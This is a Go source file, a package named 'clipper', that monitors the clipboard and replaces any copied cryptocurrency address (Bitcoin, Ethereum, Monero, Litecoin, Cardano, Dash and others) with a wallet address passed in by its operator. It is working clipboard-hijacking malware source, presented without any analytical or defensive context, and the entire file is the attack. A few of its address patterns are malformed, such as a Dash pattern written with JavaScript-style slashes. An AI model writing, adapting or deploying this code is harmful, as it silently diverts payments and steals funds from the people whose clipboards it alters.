package clipper

import (
	"context"
	"golang.design/x/clipboard"
	"regexp"
)

func Run(cryptos map[string]string) {
	var regexs = map[string]*regexp.Regexp{
		"BTC":  regexp.MustCompile("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"),
		"ETH":  regexp.MustCompile("^0x[a-zA-F0-9]{40}$"),
		"MON":  regexp.MustCompile("^4([0-9]|[A-B])(.){93}$"),
		"LTC":  regexp.MustCompile("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"),
		"XCH":  regexp.MustCompile("^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$"),
		"PCH":  regexp.MustCompile("^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$"),
		"CCH":  regexp.MustCompile("^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$"),
		"ADA":  regexp.MustCompile("addr1[a-z0-9]+"),
		"DASH": regexp.MustCompile("/X[1-9A-HJ-NP-Za-km-z]{33}$/g"),
	}

	for data := range clipboard.Watch(context.TODO(), clipboard.FmtText) {
		for crypto, regex := range regexs {
			if regex.Match(data) && regex.MatchString(cryptos[crypto]) {
				clipboard.Write(clipboard.FmtText, []byte(cryptos[crypto]))
			}
		}
	}
}
